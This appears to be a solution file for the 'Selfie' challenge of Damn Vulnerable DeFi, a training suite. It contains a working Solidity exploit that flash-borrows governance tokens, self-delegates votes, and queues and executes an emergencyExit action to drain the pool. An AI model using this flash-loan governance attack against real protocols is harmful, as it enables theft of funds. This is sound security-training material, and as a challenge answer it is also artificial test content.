// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieAttacker is IERC3156FlashBorrower {
    SelfiePool private immutable pool;
    SimpleGovernance private immutable governance;
    DamnValuableVotes private immutable token;
    address private immutable recovery;
    uint256 public actionId;

    constructor(SelfiePool _pool, SimpleGovernance _governance, DamnValuableVotes _token, address _recovery) {
        pool = _pool;
        governance = _governance;
        token = _token;
        recovery = _recovery;
    }

    function initiateAttack() external {
        uint256 borrowAmount = pool.maxFlashLoan(address(token));
        pool.flashLoan(this, address(token), borrowAmount, "");
    }

    function onFlashLoan(address initiator, address tokenAddress, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        require(tokenAddress == address(token), "Unexpected token");

        // Delegate voting power to ourselves
        token.delegate(address(this));

        // Queue the governance action to drain the pool directly to the recovery address
        actionId = governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", recovery));

        // Approve the pool to take back the flash loan
        token.approve(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeDrainAction() external {
        governance.executeAction(actionId);
    }
}

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        // Deploy the attacker contract
        SelfieAttacker attacker = new SelfieAttacker(pool, governance, token, recovery);

        // Step 1: Perform the flash loan attack and queue the action
        attacker.initiateAttack();

        // Step 2: Fast forward time to bypass the governance delay
        vm.warp(block.timestamp + governance.getActionDelay());

        // Step 3: Execute the governance action to drain the pool directly to the recovery address
        attacker.executeDrainAction();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
